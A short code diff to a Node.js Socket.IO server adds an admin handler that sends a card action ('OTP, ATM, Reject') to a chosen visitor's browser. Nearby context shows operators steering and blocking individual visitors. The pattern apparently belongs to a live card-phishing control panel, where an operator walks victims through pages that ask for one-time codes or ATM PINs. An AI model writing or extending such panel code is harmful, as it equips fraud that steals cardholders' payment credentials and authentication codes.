@@ -388,6 +388,12 @@ io.on("connection", (socket) => {
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
   });
 
+  // Admin: Card action (OTP, ATM, Reject)
+  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
+    io.to(visitorSocketId).emit("card:action", action);
+    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
+  });
+
   // Admin: Block visitor
   socket.on("admin:block", (visitorSocketId) => {
     const visitor = visitors.get(visitorSocketId);
